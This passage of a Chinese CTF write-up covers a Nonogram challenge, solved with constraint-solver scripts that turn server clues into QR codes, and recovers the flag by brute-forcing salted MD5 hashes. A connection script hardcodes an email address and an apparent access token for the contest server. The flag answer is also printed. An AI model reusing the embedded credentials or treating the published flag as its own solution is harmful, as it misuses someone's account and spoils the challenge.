14px;">这里方便变成写了个递归，深度有点大，所以躲开了下系统限制：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">import&nbsp;sys
&nbsp;sys.setrecursionlimit(1000000)
&nbsp;fr=&quot;start&quot;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;prelist=[&quot;1&quot;]*999999
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;def&nbsp;openfuck(fr):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=open(&quot;GAME/&quot;+fr+&quot;.txt&quot;,&quot;r&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rr=r.read()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;fr,rr,rr.encode(&quot;hex&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;frn=rr.split(&quot;\n&quot;)[0].split(&quot;xt&nbsp;is&nbsp;&quot;)[1].split(&quot;&nbsp;&quot;)[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;prelist[int(frn)]==&quot;1&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prelist[int(frn)]=fr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openfuck(frn)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;or&quot;&nbsp;in&nbsp;rr:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;frn2=rr.split(&quot;\n&quot;)[0].split(&quot;or&nbsp;&quot;)[1].split(&quot;&nbsp;&quot;)[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;prelist[int(frn2)]==&quot;1&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prelist[int(frn2)]=fr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openfuck(frn2)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;openfuck(&quot;start&quot;)
&nbsp;&nbsp;&nbsp;
&nbsp;final=[]
&nbsp;test=&quot;376831&quot;
&nbsp;&nbsp;&nbsp;while&nbsp;test!=&quot;start&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final.append(test)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test=prelist[int(test)]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;test</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span><br/></p><p><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">300&nbsp; Nonogram&nbsp;</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">本题是一个nonogram游戏，游戏开始后服务端发来行列的数值，据此解出相应的图片，在解题过程中发现解出的图片都是二维码，而且是经过一定的破坏，电脑端没找到什么好的工具，都是用微信扫的….</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">解nonogram方面搜了挺多工具，最终发现一个比较快的，参考</span><a href="http://www.hakank.org/constraint_programming_blog/2010/11/google_cp_solver_a_much_faster_nonogram_solver_using_defaultsearch.html" style="text-decoration: underline; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">http://www.hakank.org/constraint_programming_blog/2010/11/google_cp_solver_a_much_faster_nonogram_solver_using_defaultsearch.html</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">二维码的图片</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t017f8995382ae07bfd.png" title="t01b0c638623e8db14f.png" alt="http://p9.qhimg.com/t01b0c638623e8db14f.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">最终解出的二维码扫完之后如下，</span></p><table cellspacing="0" cellpadding="0"><tbody><tr class="firstRow"><td width="553" valign="top" style="border-color: windowtext; border-width: 1px; padding: 0px 7px;"><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">b2403b96?8924408|Next:id|Salt:5</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">59b6a648?8a85a2f|Next:w|Salt:a</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">ebcfd0bc?c532969|Next:eval|Salt:d</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">30cfce11?f4fe85d|Next:bash|Salt:1</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">6e9b1036?8dd8d17|Next:ls|Salt:c</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">679df8e4?564b41e|Next:dir|Salt:f</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">8eb99012?513f24f|Next:cd|Salt:f</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">e0327ad8?8d138f2|Next:mv|Salt:7</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">32d17e56?07902b2|Next:cp|Salt:2</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">7e88149a?8dd32b2|Next:pwd|Salt:3</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">a57b0395?163467c|Next:tree|Salt:3</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">f75f2a3e?6164d0f|Next:apt|Salt:9</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">41bb47e0?09205ea|Next:mysql|Salt:d</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">5cb4d45b?d0e5624|Next:php|Salt:c</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">92327e4c?43d619d|Next:head|Salt:4</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">3ad1439f?85ac494|Next:tail|Salt:b</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">68b6edd3?15b3edc|Next:cat|Salt:1</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">9f078b06?0cd507d|Next:grep|Salt:7</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">a50c413a?c7e05ad|Next:more|Salt:3</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">36b90d08?4cf640b|Next:less|Salt:b</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">6e7929b1?5f85978|Next:vim|Salt:3</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">4dfa42ca?dbd0694|Next:nano|Salt:2</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">8b94aee6?a2f1642|Next:sed|Salt:f</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">4cea9109?07cacd8|Next:awk|Salt:1</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">4cee5724?a9b28b7|Next:ps|Salt:a</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">6a60928b?5a7e228|Next:top|Salt:8</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">d34d9c29?711bdb3|Next:kill|Salt:7</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">b7942173?881b53e|Next:find|Salt:8</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">f766fa44?1ed0ff6|Next:break|Salt:4</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">4528ad8b?6d6bbed|Next:gcc|Salt:4</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">aa6880d6?7b76c95|Next:debug|Salt:0</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">c30201f7?f142449|Next:git|Salt:0</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">a9ded88f?8ecee47|Next:curl|Salt:9</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">f062936a?6d3c8bd|Next:wget|Salt:5</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">6ed83efb?5042fb3|Next:gzip|Salt:b</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">22bcc25a?f606eb5|Next:tar|Salt:4</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">fc8586df?4d1bc0e|Next:ftp|Salt:3</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">08e95939?adf34b1|Next:ssh|Salt:9</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">74b5a988?9bbd4b5|Next:exit|Salt:c</span></p></td></tr></tbody></table><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">所有题目解完后服务器提示这个，如下图，纠结了半天。。combine这个词用的简直..</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01bc25ee2f6ebae366.png" title="t0100a3d134464b8c36.png" alt="http://p5.qhimg.com/t0100a3d134464b8c36.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">后来猜了一下发现，flag的每个字母加上salt算出来的16位MD5、正好是前面的一串字符串。这样爆破就可以爆破出来了。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">Flag是SSCTF{02909c92cd8efb656435f43fa8414147}</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">附上脚本，好几个，挺乱的，有一些特例运行不了手工调整的。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">首先是连接的脚本</span></p><p><br/></p><pre class="brush:python;toolbar:false">import&nbsp;zio
import&nbsp;json
from&nbsp;CTFs.TOOL.binqr&nbsp;import&nbsp;BinQR
from&nbsp;&nbsp;&nbsp;&nbsp;nonogram_default_search&nbsp;import&nbsp;main&nbsp;as&nbsp;getSolve
&nbsp;
z&nbsp;=&nbsp;&nbsp;&nbsp;zio.zio((&#39;socket.lab.seclover.com&#39;,&nbsp;52700))
z.read_until(&#39;Email&nbsp;Addr&nbsp;:&nbsp;&#39;)
z.writeline(&#39;493568548@qq.com&#39;)
z.read_until(&#39;:&#39;)
z.writeline(&#39;RVfUzFGQsyod&#39;)
number&nbsp;=&nbsp;0
with&nbsp;open(&#39;input&#39;,&nbsp;&#39;r&#39;)&nbsp;as&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;line&nbsp;in&nbsp;f.readlines():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;for&nbsp;line&nbsp;in&nbsp;[&#39;sudo&nbsp;su\n&#39;,&nbsp;&#39;id\n&#39;]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;line:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z.read_until([&#39;#&#39;,&nbsp;&#39;$&#39;])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z.write(line)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;number&nbsp;+=&nbsp;1
f&nbsp;=&nbsp;open(&#39;input&#39;,&nbsp;&#39;a+&#39;)
z.read_until(zio.EOF)
while&nbsp;z.isalive():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z.readline()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;z.read_line().strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&#39;&quot;?&quot;&#39;&nbsp;in&nbsp;data:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;r&nbsp;in&nbsp;&#39;0123456789&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;datac&nbsp;=&nbsp;&nbsp;&nbsp;data.replace(&#39;&quot;?&quot;&#39;,&nbsp;r)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;json.loads(datac)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;col&nbsp;=&nbsp;j[&#39;col&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row&nbsp;=&nbsp;j[&#39;row&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;getSolve(row,&nbsp;col)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;l:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;l[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;BinQR(l)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b.save(str(number)&nbsp;+&nbsp;&#39;.&#39;&nbsp;+&nbsp;r&nbsp;+&nbsp;&nbsp;&nbsp;&#39;.png&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b.show()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;json.loads(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;col&nbsp;=&nbsp;j[&#39;col&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row&nbsp;=&nbsp;j[&#39;row&#39;]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l&nbsp;=&nbsp;getSolve(row,&nbsp;col)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;l:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;BinQR(l)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b.save(str(number)&nbsp;+&nbsp;&#39;.png&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b.show()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z.read_until([&#39;#&#39;,&nbsp;&#39;$&#39;])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getInput&nbsp;=&nbsp;raw_input()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(getInput&nbsp;+&nbsp;&#39;\n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z.writeline()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;number&nbsp;+=&nbsp;1
z.interact()
#&nbsp;#
#
import&nbsp;hashlib
import&nbsp;string</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span></p><pre class="brush:python;toolbar:false">import&nbsp;sys
&nbsp;
from&nbsp;ortools.constraint_solver&nbsp;&nbsp;&nbsp;import&nbsp;pywrapcp
&nbsp;
&nbsp;
#
#&nbsp;Make&nbsp;a&nbsp;transition&nbsp;(automaton)&nbsp;&nbsp;&nbsp;list&nbsp;of&nbsp;tuples&nbsp;from&nbsp;a
#&nbsp;single&nbsp;pattern,&nbsp;e.g.&nbsp;[3,2,1]
#
def&nbsp;&nbsp;&nbsp;make_transition_tuples(pattern):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p_len&nbsp;=&nbsp;len(pattern)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num_states&nbsp;=&nbsp;p_len&nbsp;+&nbsp;sum(pattern)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples&nbsp;=&nbsp;[]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;this&nbsp;is&nbsp;for&nbsp;handling&nbsp;0-clues.&nbsp;It&nbsp;generates
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;just&nbsp;the&nbsp;minimal&nbsp;state
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;num_states&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((1,&nbsp;0,&nbsp;1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(tuples,&nbsp;1)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;convert&nbsp;pattern&nbsp;to&nbsp;a&nbsp;0/1&nbsp;pattern&nbsp;for&nbsp;easy&nbsp;handling&nbsp;of
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;the&nbsp;states
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;[0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;pattern_index&nbsp;in&nbsp;range(p_len):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp.extend([1]&nbsp;*&nbsp;&nbsp;&nbsp;pattern[pattern_index])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp.append(0)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(num_states):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;state&nbsp;=&nbsp;i&nbsp;+&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;tmp[i]&nbsp;==&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((state,&nbsp;0,&nbsp;state))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((state,&nbsp;1,&nbsp;state&nbsp;+&nbsp;&nbsp;&nbsp;1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i&nbsp;&lt;&nbsp;num_states&nbsp;-&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;tmp[i&nbsp;+&nbsp;1]&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((state,&nbsp;1,&nbsp;&nbsp;&nbsp;state&nbsp;+&nbsp;1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((state,&nbsp;0,&nbsp;&nbsp;&nbsp;state&nbsp;+&nbsp;1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tuples.append((num_states,&nbsp;0,&nbsp;num_states))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;(tuples,&nbsp;num_states)
&nbsp;
&nbsp;
#
#&nbsp;check&nbsp;each&nbsp;rule&nbsp;by&nbsp;creating&nbsp;an&nbsp;&nbsp;&nbsp;automaton&nbsp;and&nbsp;transition&nbsp;constraint.
#
def&nbsp;check_rule(rules,&nbsp;y):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cleaned_rule&nbsp;=&nbsp;[rules[i]&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(rules))&nbsp;if&nbsp;rules[i]&nbsp;&gt;&nbsp;&nbsp;&nbsp;0]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(transition_tuples,&nbsp;last_state)&nbsp;=&nbsp;make_transition_tuples(cleaned_rule)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;initial_state&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;accepting_states&nbsp;=&nbsp;[last_state]
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solver&nbsp;=&nbsp;y[0].solver()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solver.Add(solver.TransitionConstraint(y,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;transition_tuples,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;initial_state,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;accepting_states))
&nbsp;
&nbsp;
def&nbsp;main(row_rules,&nbsp;col_rules):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rows&nbsp;=&nbsp;len(row_rules)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cols&nbsp;=&nbsp;len(col_rules)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row_rule_len&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;col_rule_len&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;row_rules:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(i)&nbsp;&gt;&nbsp;row_rule_len:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;row_rule_len&nbsp;=&nbsp;len(i)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;col_rules:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(i)&nbsp;&gt;&nbsp;col_rule_len:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;col_rule_len&nbsp;=&nbsp;len(i)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Create&nbsp;the&nbsp;solver.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;solver&nbsp;=&nbsp;pywrapcp.Solver(&#39;Nonogram&#39;)
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;variables
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;board&nbsp;=&nbsp;{}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(rows):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;j&nbsp;in&nbsp;range(cols):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;board[i,&nbsp;j]&nbsp;=&nbsp;solver.IntVar(0,&nbsp;1,&nbsp;&nbsp;&nbsp;&#39;board[%i,&nbsp;%i]&#39;&nbsp;%&nbsp;(i,&nbsp;j))
&nbsp;
